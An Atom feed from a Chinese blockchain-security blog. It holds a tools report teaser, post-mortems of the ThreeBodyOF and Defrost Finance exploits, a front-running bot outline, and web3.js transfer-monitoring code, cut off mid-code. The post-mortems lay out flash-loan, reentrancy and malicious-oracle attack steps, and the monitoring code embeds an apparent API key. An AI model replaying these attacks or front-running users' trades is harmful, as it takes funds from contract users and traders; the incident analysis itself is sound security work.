<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sissice&#39;s Blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-02-21T12:03:07.205Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Sissice</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>智能合约安全分析工具赛道研究报告：不止面向开发者，触角更是抵达 C 端用户</title>
    <link href="http://example.com/2023/02/01/SmartContractSecurityAnalysisTool/"/>
    <id>http://example.com/2023/02/01/SmartContractSecurityAnalysisTool/</id>
    <published>2023-02-01T12:00:06.000Z</published>
    <updated>2023-02-21T12:03:07.205Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>根据慢雾科技发布的《<a href="https://web3caff.com/zh/archives/47144">2022 区块链安全与反洗钱分析年度回顾</a>》报告，2022 年安全事件共 303 件，损失高达 37.77 亿美元。虽然今年的安全事件损失金额相比 2021 年的 97.95 亿美元下降约 61%。但是在被攻击事件中，智能合约漏洞仍然是重灾区，原因是智能合约具有一旦部署上线，便立即生效，不能随意改变的特性。因此智能合约审计，是每个项目上线前都需要进行的流程操作，即使是上线后，项目方也需要不断监测项目情况，以便对意外情况及时做出反应，减少损失。</p><p>因为区块链的黑暗森林法则，区块链安全赛道也成为了资本重点关注的方向，同时智能合约安全分析工具这个分支赛道已经成为安全解决方案公司的竞争重点，比如近期 MetaTrust 就刚完成了约一千万美元的种子轮融资，旨在为用户提供全智能合约自动扫描服务。由此可见，整个区块链安全市场都在朝着工具扫描与人工审计相结合的方向前进。那么智能合约安全分析工具当前赛道的发展现状如何，这些项目有哪些特性，当前存在哪些问题，未来发展如何演变 … 带着这些问题，本份研报为你逐项论述。</p></blockquote><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul><li>传统安全和 Web3 安全的区别</li><li>为什么需要进行智能合约审计</li><li>智能合约审计的流程</li><li>智能合约分析工具的利弊</li><li>智能合约部署前的安全分析<ul><li>自动分析方法<ul><li>静态分析</li><li>模糊测试</li><li>符号执行</li><li>形式化验证</li></ul></li><li>开源工具<ul><li>Slither</li><li>Echidna</li><li>Manticore</li></ul></li><li>安全服务公司<ul><li>Certik</li><li>ConsenSys Dilligence</li><li>Quantstamp</li><li>成都链安</li></ul></li></ul></li><li>智能合约部署后的安全分析<ul><li>Certik</li><li>Tenderly</li><li>Harpie</li><li>Go Plus</li><li>MistTrack</li></ul></li><li>未来展望</li><li>参考文献</li></ul><p>阅读全文：<a href="https://research.web3caff.com/zh/archives/6144">https://research.web3caff.com/zh/archives/6144</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;根据慢雾科技发布的《&lt;a href=&quot;https://web3caff.com/zh/archives/47144&quot;&gt;2022 区块链安全与反洗钱分析年度回顾&lt;/a&gt;》报告，2022 年安全事件共 303 件，损失高达 37.77 亿美元。虽然今年</summary>
      
    
    
    
    
    <category term="事件分析" scheme="http://example.com/tags/%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>ThreeBodyOF 攻击事件分析</title>
    <link href="http://example.com/2023/01/14/ThreeBodyOFAnalyse/"/>
    <id>http://example.com/2023/01/14/ThreeBodyOFAnalyse/</id>
    <published>2023-01-14T11:52:18.000Z</published>
    <updated>2023-03-07T14:25:11.127Z</updated>
    
    <content type="html"><![CDATA[<h2 id="事件背景"><a href="#事件背景" class="headerlink" title="事件背景"></a><strong>事件背景</strong></h2><p>2023 年 1 月 12 日，BSC 上的 ThreeBodyOF 受到攻击，损失 1.76k BSC-USD。该项目方在 twitter 上的最后一次活跃是 2021 年 11 月 6 日。此次攻击中，攻击者借助闪电贷，窃取了合约中剩下的作为添加流动性奖励的token。</p><h2 id="攻击地址交易信息"><a href="#攻击地址交易信息" class="headerlink" title="攻击地址交易信息"></a><strong>攻击地址交易信息</strong></h2><p>攻击合约地址：<a href="https://bscscan.com/address/0xd838b8b3df060163e9eca4a5757ce457b04013c8">0xd838b8b3df060163e9eca4a5757ce457b04013c8</a></p><p>攻击者地址：<a href="https://bscscan.com/address/0xec14b00a36869da8ea3acf93fffafd12aeea9993">0xec14b00a36869da8ea3acf93fffafd12aeea9993</a></p><p>受害者合约地址：<a href="https://bscscan.com/address/0xa2a6e3aac7920cee5590350f03c24fd4918f9324">0xa2a6e3aac7920cee5590350f03c24fd4918f9324</a></p><p>攻击交易：</p><ol><li><a href="https://bscscan.com/tx/0xfcaf5a5703b926a3cd98fdc37f85b61e877b13b65ec546355ae1000f4d066e5d">0xfcaf5a5703b926a3cd98fdc37f85b61e877b13b65ec546355ae1000f4d066e5d</a> 877.07 BSC-USD</li><li><a href="https://bscscan.com/tx/0x14bdd0ae0f479f5d706d4535ff8c9dde831187ef15ed6fe36d29ae5a84a244c7">0x14bdd0ae0f479f5d706d4535ff8c9dde831187ef15ed6fe36d29ae5a84a244c7</a> 479.45 BSC-USD</li><li><a href="https://bscscan.com/tx/0x813dac7f2b7738e39a52e6f01a50029cdcefd9b53f93471aba5ff45a0fadc9e6">0x813dac7f2b7738e39a52e6f01a50029cdcefd9b53f93471aba5ff45a0fadc9e6</a>  411.42 BSC-USD</li></ol><h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a><strong>攻击过程</strong></h2><p>这里以攻击交易 0xfcaf5a5703b926a3cd98fdc37f85b61e877b13b65ec546355ae1000f4d066e5d 为例进行分析</p><ol><li>利用闪电贷借出 217,456 BSC-USD，作为初始资金</li><li>向 Lp 池子添加流动性，并将 217,456 BSC-USD 交换为 9,504,199,652 Three-Body</li><li>将获得的 9,504,199,652 Three-Body 利用 transfer 发送给  PancakePair，再调用 skim 函数拿回这部分资金</li><li>攻击者重复进行第三个步骤大约两百次后， Lp 拥有了 16,557,126,455 Three-Body</li><li>攻击者再次调用 addLiqudity 函数大约两百次后，Lp 损失的 Three-Body，分别用来作为奖励发送给攻击者，和作为流动性发送给  PancakePair。此时攻击者的余额为 15,645,471,858 Three-Body，获得了 15,645,471,858-1,286,248,165=14,359,223,693 Three-Body 的收益</li><li>将所有的 Three-Body 交换为 218,333 BSC-USD</li><li>归还闪电贷，攻击者总收益为 218,333-217,456=877 BSC-USD</li></ol><p><img src="/2023/01/14/ThreeBodyOFAnalyse/image-20230117175149200.png" alt="image-20230117175149200"></p><p><img src="/2023/01/14/ThreeBodyOFAnalyse/image-20230117175326546.png" alt="image-20230117175326546"></p><p><img src="/2023/01/14/ThreeBodyOFAnalyse/image-20230117175521163.png" alt="image-20230117175521163"></p><h2 id="攻击原因"><a href="#攻击原因" class="headerlink" title="攻击原因"></a><strong>攻击原因</strong></h2><ol><li>每次转账时，会收取千分之五的手续费，作为奖励 mint 给 Lp 合约</li><li>每次添加流动性时，会将当前 Lp 合约所有 Three-Body 的百分之一作为奖励发放给流动性添加者</li><li>由于攻击者通过多次调用 addLiqudity 函数，获得了大量奖励，虽然 Three-Body 的价格由于流动性的增加有所下降，但是依然获得了一定的收益</li></ol><p><img src="/2023/01/14/ThreeBodyOFAnalyse/image-20230118002546939.png" alt="image-20230118002546939"></p><p><img src="/2023/01/14/ThreeBodyOFAnalyse/image-20230118002649787.png" alt="image-20230118002649787"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;事件背景&quot;&gt;&lt;a href=&quot;#事件背景&quot; class=&quot;headerlink&quot; title=&quot;事件背景&quot;&gt;&lt;/a&gt;&lt;strong&gt;事件背景&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;2023 年 1 月 12 日，BSC 上的 ThreeBodyOF 受到攻击，损失 1.</summary>
      
    
    
    
    
    <category term="事件分析" scheme="http://example.com/tags/%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Defrost Finance 攻击事件分析</title>
    <link href="http://example.com/2022/12/27/DefrostFinanceAnalyse/"/>
    <id>http://example.com/2022/12/27/DefrostFinanceAnalyse/</id>
    <published>2022-12-27T03:17:14.000Z</published>
    <updated>2022-12-30T03:20:03.396Z</updated>
    
    <content type="html"><![CDATA[<h2 id="事件背景"><a href="#事件背景" class="headerlink" title="事件背景"></a><strong>事件背景</strong></h2><p>2022 年 12 月 23 日，AVAX 上的 Defrost Finance 项目发生了重入攻击（V2），黑客获得了 173,000 美元。紧接着，在2022 年 12 月 24 日，项目方进行了 rugpull（V1），损失估计超过 1200 万美元。</p><p>12 月 26 日，Defrost Finance 称参与 V1 黑客攻击（rugpull）的黑客已经退还了资金。</p><h2 id="攻击地址交易信息"><a href="#攻击地址交易信息" class="headerlink" title="攻击地址交易信息"></a><strong>攻击地址交易信息</strong></h2><h3 id="重入"><a href="#重入" class="headerlink" title="重入"></a><strong>重入</strong></h3><p>攻击交易：<a href="https://snowtrace.io/tx/0xc6fb8217e45870a93c25e2098f54f6e3b24674a3083c30664867de474bf0212d">0xc6fb8217e45870a93c25e2098f54f6e3b24674a3083c30664867de474bf0212d</a></p><p>攻击者地址：<a href="https://snowtrace.io/address/0x7373dca267bdc623dfba228696c9d4e8234469f6">0x7373Dca267bdC623dfBA228696C9d4E8234469f6</a></p><p>攻击合约地址：<a href="https://snowtrace.io/address/0x792e8f3727cad6e00c58d478798f0907c4cec340">0x792E8f3727cad6e00c58d478798F0907c4cEC340</a></p><p>受害者合约地址：<a href="https://snowtrace.io/address/0xff152e21c5a511c478ed23d1b89bb9391be6de96#code">0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96</a></p><h3 id="rugpull"><a href="#rugpull" class="headerlink" title="rugpull"></a><strong>rugpull</strong></h3><p>修改预言机交易之一：<a href="https://snowtrace.io/tx/0x6307fdc4c7cce0c06a477db59a6ad378eb674cf1c902bd1b3748408926b2582d">0x6307fdc4c7cce0c06a477db59a6ad378eb674cf1c902bd1b3748408926b2582d</a></p><p>铸币交易：<a href="https://snowtrace.io/tx/0x69e9088b9fa395e8a4fca360c74ea86039510422a0fbbb98cae6872da14e8de2">0x69e9088b9fa395e8a4fca360c74ea86039510422a0fbbb98cae6872da14e8de2</a></p><p>开发人员地址：<a href="https://snowtrace.io/address/0x3cd5854fe3a13707b7882d8290d3cae793a7751a">0x3cd5854fe3a13707b7882d8290d3cae793a7751a</a></p><p>清算者地址：<a href="https://snowtrace.io/address/0x6f31eb634aba6921fbf15fc9aa6e08f11348f64f">0x6F31EB634ABa6921fBf15fc9aA6E08f11348f64f</a></p><p>项目方合约地址：<a href="https://snowtrace.io/address/0x5a733eb741bc080abae9bf3adaed9400416932f0">0x5a733eb741bc080abae9bf3adaed9400416932f0</a></p><h2 id="攻击详细过程"><a href="#攻击详细过程" class="headerlink" title="攻击详细过程"></a><strong>攻击详细过程</strong></h2><h3 id="重入-1"><a href="#重入-1" class="headerlink" title="重入"></a><strong>重入</strong></h3><ol><li>攻击者部署攻击合约，利用 JoePair 中的 swap 函数，自行传入 calldata 来对 LSWUSDC 的 flashloan 进行调用</li><li>在攻击合约中重写 onFlashLoan 函数，并在其中对 LSWUSDC 的 deposit 进行调用，重复铸币</li><li> 将两次铸币的金额全部取出，归还闪贷的金额后，剩下的 173,637 为收益</li></ol><p><img src="/2022/12/27/DefrostFinanceAnalyse/-167237032720110.png" alt="img"><img src="/2022/12/27/DefrostFinanceAnalyse/-16723703272001.png" alt="img"></p><h3 id="rugpull-1"><a href="#rugpull-1" class="headerlink" title="rugpull"></a><strong>rugpull</strong></h3><ol><li>项目方调用 setOracleAddress 函数，为大量代币的 Collateral Vault 手动设置恶意预言机</li><li>调用 joinAndMint 函数，铸造假的抵押代币</li><li>恶意清算</li></ol><p><img src="/2022/12/27/DefrostFinanceAnalyse/-16723703272002.png" alt="img"><img src="/2022/12/27/DefrostFinanceAnalyse/-16723703272003.png" alt="img"></p><h2 id="攻击原因分析"><a href="#攻击原因分析" class="headerlink" title="攻击原因分析"></a><strong>攻击原因分析</strong></h2><h3 id="重入-2"><a href="#重入-2" class="headerlink" title="重入"></a><strong>重入</strong></h3><p>在代码中，由于deposit 和 flashloan 函数缺少防止重入的措施，导致了攻击者可以通过onFlashLoan进行重入：攻击者通过恶意合约重入到了deposit，而_deposit 函数和 flashloan 函数中都会对 onDeposit 函数进行调用，而这个函数会进行铸币操作，也就导致了攻击者可以重复铸币，获取超额利润</p><p><img src="/2022/12/27/DefrostFinanceAnalyse/-16723703272014.png" alt="img"></p><p><img src="/2022/12/27/DefrostFinanceAnalyse/-16723703272015.png" alt="img"></p><p><img src="/2022/12/27/DefrostFinanceAnalyse/-16723703272016.png" alt="img"></p><h3 id="rugpull-2"><a href="#rugpull-2" class="headerlink" title="rugpull"></a><strong>rugpull</strong></h3><p>项目方发现了攻击发生后，意外的修改预言机地址，而清算逻辑是依托预言机来获取价格，这就导致了项目方使用liquidate函数进行了恶意清算</p><p><img src="/2022/12/27/DefrostFinanceAnalyse/-16723703272017.png" alt="img"></p><p>setOracleAddress 函数中，使用完全中心化的方法（多重签名）来判断是否可以更改预言机</p><p><img src="/2022/12/27/DefrostFinanceAnalyse/-16723703272018.png" alt="img"></p><p><img src="/2022/12/27/DefrostFinanceAnalyse/-16723703272019.png" alt="img"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a><strong>参考链接</strong></h2><ol><li><a href="https://twitter.com/DefiyieldSec/status/1607070666897129473">https://twitter.com/DefiyieldSec/status/1607070666897129473</a></li><li><a href="https://twitter.com/peckshield/status/1606767457099993088">https://twitter.com/peckshield/status/1606767457099993088</a></li><li><a href="https://medium.com/@Defrost_Finance/hacked-funds-returned-to-defrost-71b9d2d1b458">https://medium.com/@Defrost_Finance/hacked-funds-returned-to-defrost-71b9d2d1b458</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;事件背景&quot;&gt;&lt;a href=&quot;#事件背景&quot; class=&quot;headerlink&quot; title=&quot;事件背景&quot;&gt;&lt;/a&gt;&lt;strong&gt;事件背景&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;2022 年 12 月 23 日，AVAX 上的 Defrost Finance 项目发生</summary>
      
    
    
    
    
    <category term="事件分析" scheme="http://example.com/tags/%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>抢跑机器人的简单实现</title>
    <link href="http://example.com/2022/12/03/uniswap-front-running/"/>
    <id>http://example.com/2022/12/03/uniswap-front-running/</id>
    <published>2022-12-03T14:37:55.000Z</published>
    <updated>2022-12-03T14:41:49.739Z</updated>
    
    <content type="html"><![CDATA[<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><ol><li>监听 uniswap 中的 pending 交易</li><li>找到契合的交易后，提高 gasPrice，进行抢跑，提前买入 token</li><li>在进行 approve 后，再将对应的代币进行售卖</li></ol><h1 id="相关地址"><a href="#相关地址" class="headerlink" title="相关地址"></a>相关地址</h1><p>在 goerli</p><p>uniswap：0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D</p><p>TUSD：0x60450439A3d91958E9Dae0918FC4e0d59a77f896</p><p>WETH：0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6</p><h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ul><li>出售代币需要先进行approve</li><li>可以提高滑点，防止失败</li></ul><h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><p><a href="https://github.com/Sissice/frontRunningBot">https://github.com/Sissice/frontRunningBot</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;监听 uniswap 中的 pending 交易&lt;/li&gt;
&lt;li&gt;找到契合的交易后，提高 gasPrice，进行抢跑，提前买入</summary>
      
    
    
    
    
    <category term="js" scheme="http://example.com/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>链上监听</title>
    <link href="http://example.com/2022/12/02/monitor/"/>
    <id>http://example.com/2022/12/02/monitor/</id>
    <published>2022-12-02T05:47:49.000Z</published>
    <updated>2022-12-02T05:49:28.516Z</updated>
    
    <content type="html"><![CDATA[<h1 id="监听代币"><a href="#监听代币" class="headerlink" title="监听代币"></a>监听代币</h1><p>以 USDT 为例</p><p>代币地址：<a href="https://etherscan.io/address/0xdac17f958d2ee523a2206206994597c13d831ec7">https://etherscan.io/address/0xdac17f958d2ee523a2206206994597c13d831ec7</a></p><h2 id="过去转账事件"><a href="#过去转账事件" class="headerlink" title="过去转账事件"></a>过去转账事件</h2><p>监听事件的方法：<a href="https://web3js.readthedocs.io/en/v1.8.1/web3-eth-contract.html#contract-events">https://web3js.readthedocs.io/en/v1.8.1/web3-eth-contract.html#contract-events</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js">  <span class="hljs-keyword">const</span> abi = [...]<br>  <span class="hljs-keyword">const</span> add = <span class="hljs-string">&quot;0xdAC17F958D2ee523a2206206994597C13D831ec7&quot;</span><br>  <span class="hljs-keyword">const</span> usdt = <span class="hljs-keyword">new</span> web3.eth.Contract(abi, add);<br><span class="hljs-comment">// 查询USDT合约最新一百个区块的Transfer事件</span><br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;查询USDT合约最新一百个区块的Transfer事件&quot;</span>)<br><span class="hljs-keyword">await</span> usdt.getPastEvents(<span class="hljs-string">&#x27;Transfer&#x27;</span>,<br>&#123;<br><span class="hljs-attr">fromBlock</span>: blocknumber - <span class="hljs-number">100</span>,<br><span class="hljs-attr">toBlock</span>: <span class="hljs-string">&#x27;latest&#x27;</span><br>&#125;,<br><span class="hljs-function">(<span class="hljs-params">err, events</span>) =&gt;</span> &#123;<br><span class="hljs-built_in">console</span>.log(events);<br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="实时转账事件"><a href="#实时转账事件" class="headerlink" title="实时转账事件"></a>实时转账事件</h2><p>订阅事件：<a href="https://web3js.readthedocs.io/en/v1.8.1/web3-eth-subscribe.html#">https://web3js.readthedocs.io/en/v1.8.1/web3-eth-subscribe.html#</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> Web3 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;web3&#x27;</span>);<br><span class="hljs-keyword">const</span> web3 = <span class="hljs-keyword">new</span> Web3(<span class="hljs-string">&#x27;wss://eth-goerli.g.alchemy.com/v2/0wp9jOR9zJMkKs6HJ_m8ksTZs-ivy7q3&#x27;</span>);<br><br><span class="hljs-comment">// 为了告诉web3.eth.subscribe我们应该跟踪哪些事件，我们可以添加以下过滤器：</span><br><span class="hljs-keyword">let</span> options = &#123;<br>  <span class="hljs-comment">// 可以指定某一代币合约，若不指定，则全局监听</span><br>  <span class="hljs-attr">address</span>: <span class="hljs-string">&#x27;0x326C977E6efc84E512bB9C30f76E30c160eD06FB&#x27;</span>,<br>  <span class="hljs-attr">topics</span>: [<br>    web3.utils.sha3(<span class="hljs-string">&#x27;Transfer(address,address,uint256)&#x27;</span>)<br>  ]<br>&#125;;<br><br><span class="hljs-keyword">const</span> abi = [<br>  &#123;<br>    <span class="hljs-string">&quot;constant&quot;</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-string">&quot;inputs&quot;</span>: [],<br>    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;symbol&quot;</span>,<br>    <span class="hljs-string">&quot;outputs&quot;</span>: [<br>      &#123;<br>        <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;string&quot;</span><br>      &#125;<br>    ],<br>    <span class="hljs-string">&quot;payable&quot;</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-string">&quot;stateMutability&quot;</span>: <span class="hljs-string">&quot;view&quot;</span>,<br>    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;function&quot;</span><br>  &#125;,<br>  &#123;<br>    <span class="hljs-string">&quot;constant&quot;</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-string">&quot;inputs&quot;</span>: [],<br>    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;decimals&quot;</span>,<br>    <span class="hljs-string">&quot;outputs&quot;</span>: [<br>      &#123;<br>        <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;uint8&quot;</span><br>      &#125;<br>    ],<br>    <span class="hljs-string">&quot;payable&quot;</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-string">&quot;stateMutability&quot;</span>: <span class="hljs-string">&quot;view&quot;</span>,<br>    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;function&quot;</span><br>  &#125;<br>];<br><br><span class="hljs-comment">// 通过使用web3.eth.subscribeweb3.js中的函数；</span><br><span class="hljs-comment">// 我们可以订阅这些代币合约发出的事件，让我们能够在每次新的代币转移发生时对其进行跟踪。</span><br><span class="hljs-comment">// 通过传递我们刚刚设置的过滤器来启动订阅：</span><br><span class="hljs-keyword">let</span> subscription = web3.eth.subscribe(<span class="hljs-string">&#x27;logs&#x27;</span>, options);<br><br><span class="hljs-comment">// 从智能合约中收集更多信息</span><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">collectData</span>(<span class="hljs-params">contract</span>) </span>&#123;<br>  <span class="hljs-keyword">const</span> [decimals, symbol] = <span class="hljs-keyword">await</span> <span class="hljs-built_in">Promise</span>.all([<br>    contract.methods.decimals().call(),<br>    contract.methods.symbol().call()<br>  ]);<br>  <span class="hljs-keyword">return</span> &#123; decimals, symbol &#125;;<br>&#125;<br><br><span class="hljs-comment">// 每次发现新的 ERC-20 交易时调用该函数</span><br>subscription.on(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (event.topics.length == <span class="hljs-number">3</span>) &#123;<br>    <span class="hljs-comment">// 使用 ERC-20 ABI 对其进行解码</span><br>    <span class="hljs-keyword">let</span> transaction = web3.eth.abi.decodeLog([&#123;<br>      <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;address&#x27;</span>,<br>      <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;from&#x27;</span>,<br>      <span class="hljs-attr">indexed</span>: <span class="hljs-literal">true</span><br>    &#125;, &#123;<br>      <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;address&#x27;</span>,<br>      <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;to&#x27;</span>,<br>      <span class="hljs-attr">indexed</span>: <span class="hljs-literal">true</span><br>    &#125;, &#123;<br>      <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;uint256&#x27;</span>,<br>      <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;value&#x27;</span>,<br>      <span class="hljs-attr">indexed</span>: <span class="hljs-literal">false</span><br>    &#125;],<br>      event.data,<br>      [event.topics[<span class="hljs-number">1</span>], event.topics[<span class="hljs-number">2</span>], event.topics[<span class="hljs-number">3</span>]]);<br><br>    <span class="hljs-keyword">const</span> contract = <span class="hljs-keyword">new</span> web3.eth.Contract(abi, event.address)<br><br>    collectData(contract).then(<span class="hljs-function"><span class="hljs-params">contractData</span> =&gt;</span> &#123;<br>      <span class="hljs-keyword">const</span> unit = <span class="hljs-built_in">Object</span>.keys(web3.utils.unitMap).find(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> web3.utils.unitMap[key] === web3.utils.toBN(<span class="hljs-number">10</span>).pow(web3.utils.toBN(contractData.decimals)).toString());<br><br>      <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`Transfer of <span class="hljs-subst">$&#123;web3.utils.fromWei(transaction.value, unit)&#125;</span> <span class="hljs-subst">$&#123;contractData.symbol&#125;</span> from <span class="hljs-subst">$&#123;transaction.<span class="hljs-keyword">from</span>&#125;</span> to <span class="hljs-subst">$&#123;transaction.to&#125;</span>`</span>)<br><br>      <span class="hljs-comment">// if (transaction.from == &#x27;0x495f947276749ce646f68ac8c248420045cb7b5e&#x27;) &#123; console.log(&#x27;Specified address sent an ERC-20 token!&#x27;) &#125;;</span><br>      <span class="hljs-comment">// if (transaction.to == &#x27;0x495f947276749ce646f68ac8c248420045cb7b5e&#x27;) &#123; console.log(&#x27;Specified address received an ERC-20 token!&#x27;) &#125;;</span><br>      <span class="hljs-comment">// if (transaction.from == &#x27;0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D&#x27; &amp;&amp; event.address == &#x27;0x6b175474e89094c44da98b954eedeac495271d0f&#x27;) &#123; console.log(&#x27;Specified address transferred specified token!&#x27;) &#125;; // event.address contains the contract address  </span><br>      <span class="hljs-comment">// if (event.address == &#x27;0x6b175474e89094c44da98b954eedeac495271d0f&#x27;) &#123; console.log(&#x27;Specified ERC-20 transfer!&#x27;) &#125;;</span><br><br>    &#125;)<br>  &#125;<br>&#125;);<br><br><span class="hljs-comment">// 查看订阅是否成功启动或是否发生任何错误</span><br>subscription.on(<span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> &#123; <span class="hljs-keyword">throw</span> err &#125;);<br>subscription.on(<span class="hljs-string">&#x27;connected&#x27;</span>, <span class="hljs-function"><span class="hljs-params">nr</span> =&gt;</span> <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;Subscription on ERC-20 started with ID %s&#x27;</span>, nr));<br></code></pre></td></tr></table></figure><p><img src="/2022/12/02/monitor/image-20221201183345989.png" alt="image-20221201183345989"></p><h2 id="所有持币人的余额"><a href="#所有持币人的余额" class="headerlink" title="所有持币人的余额"></a>所有持币人的余额</h2><h3 id="web3js"><a href="#web3js" class="headerlink" title="web3js"></a>web3js</h3><p><strong>第一种方法</strong></p><p>查询到过去区块的event，拿到to地址之后，查询balanceOf来获取余额</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 存储从事件中获取到的to地址</span><br><span 